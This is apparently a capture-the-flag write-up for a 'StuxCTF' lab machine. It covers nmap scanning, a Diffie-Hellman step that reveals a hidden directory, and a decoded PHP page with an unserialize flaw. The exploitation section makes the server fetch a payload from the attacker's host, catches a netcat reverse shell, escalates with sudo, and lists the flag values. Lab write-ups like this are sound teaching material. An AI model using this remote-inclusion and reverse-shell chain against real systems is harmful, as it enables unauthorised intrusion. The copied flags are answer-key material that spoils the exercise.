# StuxCTF

## enumeration

```bash
nmap $IP -sV -sC -oN nmap
```

ports:

- 22 (ssh)

- 80 (Apache httpd)


```bash
curl $IP -o webpage/index.html # -> Diffie-Hellman values
```



Given the values

$g = 7$, \
$a = 330$, \
$b = 450$, \
$p = 9975298661...251$, \
$g^c = 6091917800...617$


calculate the secret S using Diffie-Hellman: \
$S = (g^c)^a \mod p)^b \mod p$

Using [dh\_solver](./dh_solver.py):

```bash
./dh_solver.py # -> 47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055
```

### "What is the hidden directory?"

==> **47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055**


## website

From here, `$secret_page` will substitute for `$IP/4731502893...055`

Going to `$secret_page` shows a 'Home' button which redirects to `$secret_page/index.php`. \
In the html source is another hint: '/?file=', which seems to be a url parameter.

Trying `$secret_page/?file=user.txt` or `$secret_page/?file=root.txt` sadly only returns 'File no Exist!', however, trying `$secret_page/?file=index.php` returns a 5497 character long hexadecimal string

```bash
curl "$secret_page/?file=index.php" | grep -Eo '^[0-9a-f]+' > secret_text.txt
```

Using [cyberchef](cyberchef.org) with the contents of secret\_text.txt as input and the following recipe:

1. From Hex
2. Reverse
3. From Base64

we get the source code of index.php  -> ./webpage/secret/index.php

On line 22 of ./webpage/secret/index.php is:
```php
unserialize(file_get_contents($file_name));
```

file\_get\_contents can be used to fetch data from a remote server and unserialize can be used to load malicious code.


This code can be generated by running exploit.php:
```bash
php exploit.php > exploit.txt
```

## exploitation
```bash
# shell 1
python -m http.server 8080
```
```bash
# shell 2
nc -lnvp 4444
```
```bash
# shell 3
curl "$secret_page/?file=http://$localip:8080/exploit.txt" # upload the exploit

curl "$secret_page/exploit.php" # run the exploit
```

Shell 1 & 3 can then be closed.

```bash
# in shell 2 (reverse shell)
export TERM=xterm
echo "import pty; pty.spawn('/bin/bash')" > /tmp/upgrade.py
python /tmp/upgrade.py

ls /home # -> grecia
ls /home/grecia # -> user.txt
cat /home/grecia/user.txt # -> 0b6044b7807dd100b9e30f1bd09db53fo

sudo -i
pwd # -> /root
ls # -> root.txt
cat root.txt # -> 0028454003b42601548df551b738976c
```

### "user.txt"

==> **0b6044b7807dd100b9e30f1bd09db53f**


### "root.txt"

==> **0028454003b42601548df551b738976c**
